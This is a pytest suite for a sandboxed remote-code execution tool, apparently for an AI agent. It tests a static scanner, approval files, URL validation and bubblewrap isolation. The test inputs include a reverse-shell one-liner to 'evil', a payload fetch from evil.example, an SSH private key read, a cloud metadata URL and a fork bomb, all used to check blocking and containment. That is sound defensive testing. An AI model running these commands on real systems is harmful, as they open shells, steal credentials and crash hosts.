from __future__ import annotations

from datetime import datetime, timedelta, timezone
import hashlib
import json
import os
from pathlib import Path

import pytest

from ralfloop_agent.model_tools.remote_code import (
    ApprovalStore,
    BubblewrapSandbox,
    DownloadPolicyError,
    PublicCodeDownloader,
    RemoteCodeArtifact,
    SandboxedRemoteCodeTool,
    _validate_public_url,
    build_seccomp_filter,
    scan_remote_code,
)


def _artifact(source: str, url: str = "https://public.example/script.py") -> RemoteCodeArtifact:
    raw = source.encode("utf-8")
    return RemoteCodeArtifact(
        source=raw,
        source_url=url,
        final_url=url,
        content_type="text/x-python",
        peer_ip="93.184.216.34",
        sha256=hashlib.sha256(raw).hexdigest(),
        size_bytes=len(raw),
        fetched_at="2026-08-01T00:00:00+00:00",
    )


class _Downloader:
    def __init__(self, source: str) -> None:
        self.artifact = _artifact(source)

    def fetch(self, url: str) -> RemoteCodeArtifact:
        assert url.startswith("https://")
        return self.artifact


class _Sandbox:
    def __init__(self) -> None:
        self.calls = 0

    def execute(self, artifact: RemoteCodeArtifact, *, interpreter_name: str) -> dict:
        self.calls += 1
        return {
            "sandbox_id": "fixture",
            "backend": "fixture",
            "exit_code": 0,
            "stop_reason": "exited",
            "stdout": "ok\n",
            "stderr": "",
            "stdout_bytes": 3,
            "stderr_bytes": 0,
            "stdout_sha256": hashlib.sha256(b"ok\n").hexdigest(),
            "stderr_sha256": hashlib.sha256(b"").hexdigest(),
            "truncated": False,
            "artifacts": [],
            "duration_ms": 1,
            "limits": {},
            "isolation": {"network": "disabled"},
            "cleanup": True,
        }


class _NeverApproved:
    def consume(self, approval_id: str, artifact_hash: str) -> tuple[bool, str]:
        return False, "explicit_approval_required"


def test_safe_script_runs_only_via_sandbox_and_has_audit_hash() -> None:
    sandbox = _Sandbox()
    result = SandboxedRemoteCodeTool(
        downloader=_Downloader("print('ok')\n"), sandbox=sandbox, approvals=_NeverApproved()
    ).run({"url": "https://public.example/script.py", "interpreter": "python3"})

    assert result["classification"] == "safe"
    assert result["executed"] is True
    assert result["stdout"] == "ok\n"
    assert result["cleanup"] is True
    assert len(result["sha256"]) == 64
    assert sandbox.calls == 1
    assert [row["event"] for row in result["audit"]] == [
        "remote_code_download_started",
        "remote_code_downloaded",
        "remote_code_scanned",
        "remote_code_sandbox_started",
        "remote_code_sandbox_finished",
        "remote_code_sandbox_destroyed",
    ]


@pytest.mark.parametrize(
    ("source", "rule"),
    (
        ("import os\nos.system('bash -i >& /dev/tcp/evil/4444 0>&1')", "reverse_shell"),
        ("import requests\nrequests.get('https://evil.example/payload')", "secondary_download"),
        ("open('/home/u/.ssh/id_rsa').read()", "credential_access"),
        ("import os\nos.system('crontab -l')", "persistence"),
        ("import os\nos.system('sudo id')", "privilege_escalation"),
        ("import os\nos.system('unshare --mount sh')", "sandbox_escape"),
    ),
)
def test_prohibited_code_is_blocked_before_execution(source: str, rule: str) -> None:
    sandbox = _Sandbox()
    result = SandboxedRemoteCodeTool(
        downloader=_Downloader(source), sandbox=sandbox, approvals=_NeverApproved()
    ).run({"url": "https://public.example/hostile.py"})

    assert result["classification"] == "blocked"
    assert result["reason"] == "static_policy_blocked"
    assert result["executed"] is False
    assert rule in {row["rule"] for row in result["findings"]}
    assert sandbox.calls == 0


def test_obfuscated_code_requires_explicit_hash_bound_approval() -> None:
    sandbox = _Sandbox()
    result = SandboxedRemoteCodeTool(
        downloader=_Downloader("import base64\nprint(base64.b64decode('b2s='))\n"),
        sandbox=sandbox,
        approvals=_NeverApproved(),
    ).run({"url": "https://public.example/encoded.py"})

    assert result["classification"] == "suspicious"
    assert result["approval_required"] is True
    assert result["reason"] == "explicit_approval_required"
    assert result["executed"] is False
    assert sandbox.calls == 0


def test_approval_file_is_owner_only_hash_bound_expiring_and_one_shot(tmp_path: Path) -> None:
    source = "import base64\nprint(base64.b64decode('b2s='))\n"
    artifact = _artifact(source)
    approval_id = "approval_1234567890"
    approval = tmp_path / f"{approval_id}.json"
    approval.write_text(
        json.dumps(
            {
                "approved": True,
                "sha256": artifact.sha256,
                "expires_at": (datetime.now(timezone.utc) + timedelta(minutes=5)).isoformat(),
            }
        ),
        encoding="utf-8",
    )
    approval.chmod(0o600)
    store = ApprovalStore(tmp_path)

    assert store.consume(approval_id, artifact.sha256) == (True, "approval_valid")
    assert not approval.exists()
    assert store.consume(approval_id, artifact.sha256) == (False, "approval_unavailable")


@pytest.mark.parametrize(
    "url",
    (
        "file:///tmp/payload.py",
        "http://93.184.216.34/payload.py",
        "https://127.0.0.1/payload.py",
        "https://169.254.169.254/latest/meta-data/",
        "https://10.0.0.1/payload.py",
        "https://user:secret@example.com/payload.py",
    ),
)
def test_download_policy_denies_file_loopback_metadata_private_and_credentials(url: str) -> None:
    resolver = lambda *args, **kwargs: [(2, 1, 6, "", (url.split("//")[-1].split("/")[0].split(":")[0], 443))]
    with pytest.raises(DownloadPolicyError):
        _validate_public_url(url, resolver)


def test_download_policy_accepts_only_public_https_and_preserves_no_query() -> None:
    resolver = lambda *args, **kwargs: [(2, 1, 6, "", ("93.184.216.34", 443))]
    assert _validate_public_url("https://example.com/code.py?token=secret", resolver) == ("93.184.216.34",)


def test_malformed_url_fails_closed_without_crashing_tool() -> None:
    result = SandboxedRemoteCodeTool().run({"url": "https://[::1"})
    assert result["classification"] == "failed"
    assert result["executed"] is False
    assert result["reason"] == "url_invalid"


class _Response:
    status_code = 200
    headers = {"Content-Type": "text/x-python; charset=utf-8", "Content-Length": "12"}

    def raise_for_status(self) -> None:
        return None

    def iter_content(self, size: int):
        yield b"print('ok')\n"

    def close(self) -> None:
        return None


class _Session:
    trust_env = True

    def get(self, *args, **kwargs):
        return _Response()


def test_downloader_records_provenance_size_content_type_and_sha_without_query() -> None:
    resolver = lambda *args, **kwargs: [(2, 1, 6, "", ("93.184.216.34", 443))]
    downloader = PublicCodeDownloader(
        resolver=resolver,
        session=_Session(),
        peer_address=lambda response: "93.184.216.34",
    )
    artifact = downloader.fetch("https://example.com/code.py?token=secret")

    assert artifact.source == b"print('ok')\n"
    assert artifact.source_url == "https://example.com/code.py"
    assert artifact.content_type == "text/x-python"
    assert artifact.size_bytes == 12
    assert artifact.sha256 == hashlib.sha256(artifact.source).hexdigest()
    assert downloader.session.trust_env is False


def test_seccomp_filter_is_nonempty_and_deterministic() -> None:
    first = build_seccomp_filter()
    assert len(first) > 256
    assert first == build_seccomp_filter()


REAL_SANDBOX = pytest.mark.skipif(
    os.getenv("RALF_TEST_REAL_SANDBOX") != "1",
    reason="set RALF_TEST_REAL_SANDBOX=1 on prepared host",
)


def _execute_real(source: str, **limits) -> dict:
    return BubblewrapSandbox(**limits).execute(_artifact(source))


@REAL_SANDBOX
def test_real_innocuous_script_runs_unprivileged_with_empty_env_and_artifact_hash() -> None:
    result = _execute_real(
        "import os\nfrom pathlib import Path\n"
        "print('SAFE', os.getuid(), os.environ.get('HOME'), os.environ.get('SECRET'))\n"
        "status=Path('/proc/self/status').read_text()\n"
        "print(next(x for x in status.splitlines() if x.startswith('NoNewPrivs:')))\n"
        "print(next(x for x in status.splitlines() if x.startswith('CapEff:')))\n"
        "open('made.txt','w').write('artifact')\n"
    )

    assert result["exit_code"] == 0
    assert "SAFE 65534 /home/sandbox None" in result["stdout"]
    assert "NoNewPrivs:\t1" in result["stdout"]
    assert "CapEff:\t0000000000000000" in result["stdout"]
    assert result["isolation"]["network"] == "disabled"
    assert result["isolation"]["host_data_mounts"] is False
    assert result["isolation"]["capabilities"] == "none"
    assert result["isolation"]["no_new_privileges"] is True
    assert result["cleanup"] is True
    assert result["artifacts"] == [
        {
            "path": "made.txt",
            "size_bytes": 8,
            "sha256": hashlib.sha256(b"artifact").hexdigest(),
        }
    ]


@REAL_SANDBOX
def test_real_network_syscall_is_denied_by_namespace_and_seccomp() -> None:
    result = _execute_real(
        "import socket\n"
        "try:\n socket.socket()\nexcept OSError as e:\n print('NETWORK_DENIED', e.errno)\n"
    )
    assert result["exit_code"] == 0
    assert "NETWORK_DENIED 1" in result["stdout"]


@REAL_SANDBOX
def test_real_secondary_executable_is_denied_after_interpreter_start() -> None:
    result = _execute_real(
        "import subprocess\n"
        "try:\n subprocess.run(['/usr/bin/id'], check=True)\n"
        "except OSError as e:\n print('EXEC_DENIED', e.errno)\n"
    )
    assert result["exit_code"] == 0
    assert "EXEC_DENIED 1" in result["stdout"]


@REAL_SANDBOX
def test_real_host_read_and_write_are_not_mounted(tmp_path: Path) -> None:
    marker = tmp_path / "host-marker"
    marker.write_text("unchanged", encoding="utf-8")
    before = hashlib.sha256(marker.read_bytes()).hexdigest()
    source = (
        "from pathlib import Path\n"
        f"p=Path({str(marker)!r})\n"
        "try:\n print(p.read_text()); p.write_text('changed')\n"
        "except OSError as e:\n print('HOST_DENIED', type(e).__name__)\n"
    )
    result = _execute_real(source)

    assert result["exit_code"] == 0
    assert "HOST_DENIED" in result["stdout"]
    assert hashlib.sha256(marker.read_bytes()).hexdigest() == before


@REAL_SANDBOX
def test_real_fork_bomb_is_capped_and_leaves_no_children() -> None:
    result = _execute_real(
        "import os,time\nchildren=[]\n"
        "for i in range(128):\n"
        " try:\n  pid=os.fork()\n"
        " except OSError:\n  print('FORK_LIMIT'); break\n"
        " if pid==0:\n  time.sleep(.2); os._exit(0)\n"
        " children.append(pid)\n"
        "for pid in children:\n\n try: os.waitpid(pid,0)\n except ChildProcessError: pass\n",
        timeout_sec=3,
        pids_max=8,
    )
    assert "FORK_LIMIT" in result["stdout"]
    assert result["cleanup"] is True


@REAL_SANDBOX
def test_real_timeout_is_hard() -> None:
    result = _execute_real("while True: pass\n", timeout_sec=0.4)
    assert result["stop_reason"] == "timeout"
    assert result["exit_code"] != 0
    assert result["cleanup"] is True


@REAL_SANDBOX
def test_real_memory_is_limited() -> None:
    result = _execute_real("x=bytearray(256*1024*1024)\nprint(len(x))\n", memory_mb=64)
    assert result["exit_code"] != 0
    assert result["limits"]["memory_mb"] == 64
    assert result["cleanup"] is True


@REAL_SANDBOX
def test_real_output_is_bounded_and_hashed() -> None:
    result = _execute_real("print('x'*100000)\n", output_bytes=2048)
    assert result["stop_reason"] == "output_limit"
    assert result["truncated"] is True
    assert result["stdout_bytes"] > 2048
    assert len(result["stdout_sha256"]) == 64
    assert len(result["stdout"].encode("utf-8")) < 4096
    assert result["cleanup"] is True


@REAL_SANDBOX
def test_real_output_secret_is_redacted_while_full_stream_is_hashed() -> None:
    result = _execute_real("print('api_key=' + 'A'*24)\n")
    assert result["exit_code"] == 0
    assert "A" * 24 not in result["stdout"]
    assert "api_key=[REDACTED]" in result["stdout"]
    assert len(result["stdout_sha256"]) == 64
